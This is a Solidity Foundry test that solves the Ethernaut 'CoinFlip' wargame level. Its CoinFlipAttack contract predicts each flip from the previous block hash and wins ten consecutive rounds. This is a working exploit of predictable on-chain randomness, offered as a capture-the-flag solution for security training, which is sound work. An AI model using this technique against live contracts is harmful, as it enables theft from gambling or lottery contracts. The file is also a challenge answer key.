// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/03-CoinFlip/CoinFlipFactory.sol";
import "../src/Ethernaut.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip coinFlip;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        coinFlip = ICoinFlip(_coinFlip);
    }

    function guessFlip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = blockValue / FACTOR == 1 ? true : false;
        return coinFlip.flip(side);
    }
}

contract CoinFlipTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 1 ether);
    }

    function testCoinFlip() public {
        // Level setup
        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        // Level attack
        CoinFlipAttack attack = new CoinFlipAttack(levelAddress);
        for (uint i = 0; i < 10; i++) {
            vm.roll(2 + i);
            assertTrue(attack.guessFlip());
        }
        assertGe(ethernautCoinFlip.consecutiveWins(), 10);

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}